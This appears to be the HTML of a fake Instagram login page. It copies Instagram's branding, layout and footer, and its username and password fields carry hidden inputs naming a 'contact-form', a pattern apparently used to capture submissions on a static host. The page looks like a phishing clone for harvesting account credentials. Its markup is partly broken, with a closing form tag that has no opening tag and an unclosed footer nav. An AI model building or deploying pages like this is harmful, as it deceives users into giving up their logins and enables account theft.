<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #262626;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px 0;
    }
    a {
      color: #0095f6;
      text-decoration: none;
      cursor: pointer;
    }
    a:hover {
      text-decoration: underline;
    }

    .login-container {
      background: #fff;
      width: 350px;
      border: 1px solid #dbdbdb;
      padding: 40px;
      box-sizing: border-box;
      font-size: 14px;
      display: flex;
      flex-direction: column;
      margin-bottom: 10px;
    }

    .instagram-logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 44px;
      text-align: center;
      margin-bottom: 24px;
      color: #262626;
      user-select: none;
    }

    input[type="text"],
    input[type="password"] {
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 8px;
      margin-bottom: 6px;
      font-size: 14px;
      color: #262626;
      outline: none;
      width: 100%;
    }

    input[type="text"]::placeholder,
    input[type="password"]::placeholder {
      color: #8e8e8e;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border: 1px solid #a8a8a8;
    }

    button.login-btn {
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: 600;
      font-size: 14px;
      padding: 8px 0;
      margin: 8px 0;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
    }

    button.login-btn:hover {
      background-color: #0077cc;
    }

    .or-container {
      display: flex;
      align-items: center;
      color: #8e8e8e;
      margin: 10px 0;
      font-weight: 600;
      font-size: 13px;
    }

    .or-container .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or-container .text {
      margin: 0 18px;
    }

    .facebook-login {
      color: #385185;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin: 10px 0;
    }

    .forgot-password {
      color: #00376b;
      font-size: 12px;
      text-align: center;
      margin: 12px 0;
    }

    .signup-container {
      background: #fff;
      width: 350px;
      border: 1px solid #dbdbdb;
      padding: 20px;
      box-sizing: border-box;
      font-size: 14px;
      text-align: center;
      margin-bottom: 20px;
    }

    footer {
      width: 100%;
      max-width: 800px;
      color: #8e8e8e;
      font-size: 12px;
      text-align: center;
      padding: 0 20px;
    }

    footer nav {
      margin-bottom: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px;
    }

    footer nav a {
      color: #8e8e8e;
    }

    .lang-select {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      margin-bottom: 10px;
    }

    .copyright {
      margin-top: 10px;
    }

    @media (max-width: 450px) {
      .login-container,
      .signup-container {
        width: 100%;
        border: none;
        background: transparent;
      }
      
      body {
        padding: 0;
        background: #fff;
      }
    }
  </style>
</head>
<body>
  <main>
    <section class="login-container" aria-label="Login to Instagram">
      <h1 class="instagram-logo">Instagram</h1>

  <input type="hidden" name="form-name" value="contact-form" />

  <input type="hidden" name="bot-field" />

  <!-- Actual form fields -->
  <input type="text" name="username" placeholder="Phone number, username, or email" required />
  <input type="password" name="password" placeholder="Password" required />

  <button type="submit" class="login-btn">Log in</button>
</form>




      <div class="or-container">
        <div class="line"></div>
        <div class="text">OR</div>
        <div class="line"></div>
      </div>
      <a href="#" class="facebook-login">
        Log in with Facebook
      </a>
      <a href="#" class="forgot-password">Forgot password?</a>
    </section>

    <section class="signup-container">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </section>
  </main>

  <footer>
    <nav>
      <a href="#">Meta</a>

    <div class="copyright">© 2025 Instagram from Meta</div>
  </footer>
